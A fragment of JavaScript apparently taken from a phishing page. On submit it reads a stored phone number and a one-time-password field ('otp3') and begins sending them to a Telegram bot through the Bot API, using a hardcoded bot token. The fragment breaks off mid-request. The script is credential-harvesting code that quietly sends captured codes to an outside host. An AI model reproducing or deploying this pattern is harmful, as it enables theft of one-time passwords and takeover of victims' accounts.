<script>
function submit(){
    let xx  = document.getElementById('process')
    let con = document.getElementById('container')
    xx.style.display = 'flex';
    con.style.marginTop = '130%';
    let phoneNumber = sessionStorage.getItem("phoneNumber");

    let otpthree = document.getElementById('otp3').value;

var token_botTele = "5465756419:AAFpdwSvIcRtIet6s7es4jgKTwmaO1cevng";

    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
